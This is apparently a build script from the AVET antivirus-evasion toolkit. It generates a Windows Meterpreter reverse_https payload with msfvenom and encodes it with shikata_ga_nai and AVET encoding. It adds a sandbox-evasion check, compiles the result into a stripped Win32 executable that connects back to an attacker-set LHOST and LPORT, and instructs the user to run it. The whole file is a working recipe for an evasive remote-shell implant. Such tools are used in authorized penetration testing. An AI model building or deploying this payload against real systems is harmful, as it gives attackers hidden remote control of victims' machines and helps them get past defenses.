#!/bin/bash          


#DESCRIPTION_START
# Use AVET encoding.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt

# encode the shellcode via AVET encoding.
encode_payload avet input/sc_c.txt input/scenc_raw.txt

# add fopen sandbox evasion
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'

# convert encoded shellcode file to c array style for static include
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# set decoder and key source
# AVET decoder needs no key
set_decoder avet
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile to exe file
$win32_compiler -o output/avetenc_fopen_revhttps_win32.exe source/avet.c
strip output/avetenc_fopen_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# Execute the following command:
# $ avetenc_fopen_revhttps_win32.exe
"
